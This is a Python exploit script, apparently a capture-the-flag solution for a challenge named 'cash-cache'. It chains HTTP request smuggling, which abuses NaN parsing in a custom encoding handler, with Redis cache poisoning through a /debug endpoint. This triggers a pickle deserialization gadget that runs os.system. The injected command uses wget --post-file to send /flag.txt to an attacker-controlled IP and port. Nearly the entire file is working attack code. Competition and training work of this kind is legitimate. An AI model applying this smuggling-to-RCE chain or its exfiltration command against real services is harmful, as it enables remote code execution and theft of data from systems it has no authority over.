from pwn import remote, context
from urllib.parse import urlencode
import pickle
import base64
import sys
import requests

context.log_level = "DEBUG"
IP = sys.argv[1]
PORT = sys.argv[2]


class PickleRCE(object):
    def __reduce__(self):
        import os

        return (os.system, (command,))


# prepare pickle gadget
command = "wget --post-file=/flag.txt http://{}:{}".format(IP, PORT)
rce = base64.b64encode(pickle.dumps(PickleRCE())).decode()

r = remote("cash-cache.ctf.umasscybersec.org", 80)

# create cache entry
uid = requests.get("http://cash-cache.ctf.umasscybersec.org/").cookies["uid"]

# normal request with Cash-Encoding
stage1 = """GET /asd HTTP/1.1
Host: localhost:5000
Connection: close
Cash-Encoding: Money!
Content-Length: {}

{}
""".replace("\n", "\r\n")
body1 = "nan{} DOLLARS"  # trigger request smuggling using nan

# smuggled request to poison redis
stage2 = """POST /debug HTTP/1.1
Host: localhost:3000
Connection: close
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".replace("\n", "\r\n")
body2 = urlencode({"uid": uid, "data": rce})

payload2 = stage2.format(len(body2), body2)

"""
in order to smuggle more than 11 bytes we need to abuse this math

        index = round(amount) if amount <= len(
            stream_text) else len(stream_text) - len(cur)

by making cur (the line that contains the nan injection) bigger we can control how many bytes we want to smuggle
this is all due to the fact that python will happily evaluate float('nan\t\t\t') as NaN
"""
body1 = body1.format("\t" * (len(payload2) - 11 - 2))

payload = stage1.format(len(payload2) + len(body1), body1)
payload += payload2

r.send(payload)
r.recv(4096)

print(payload)

# trigger pickle load from cache
requests.get("http://cash-cache.ctf.umasscybersec.org/", cookies={"uid": uid})
